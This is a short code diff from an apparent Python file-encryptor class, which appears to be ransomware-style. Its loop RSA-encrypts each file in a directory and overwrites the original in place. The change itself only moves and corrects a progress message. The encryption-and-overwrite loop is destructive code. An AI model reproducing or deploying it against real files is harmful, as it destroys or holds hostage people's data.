@@ -26,13 +26,13 @@ class EncrypterThread(threading.Thread):
                 break
 
             sleep(1)
-            print(
-                f"File {file} was encruptad! Files left {files_count-file_num+1}{files_count}"
-            )
             with open(f"{self._dir}\\{file}", "rb") as f:
                 data = rsa.encrypt(f.read(), public_key)
             with open(f"{self._dir}\\{file}", "wb") as f:
                 f.write(data)
+            print(
+                f"File {file} was encruptad! Files left {files_count-file_num-1}/{files_count}"
+            )
 
     def stop(self):
         self._stop = True
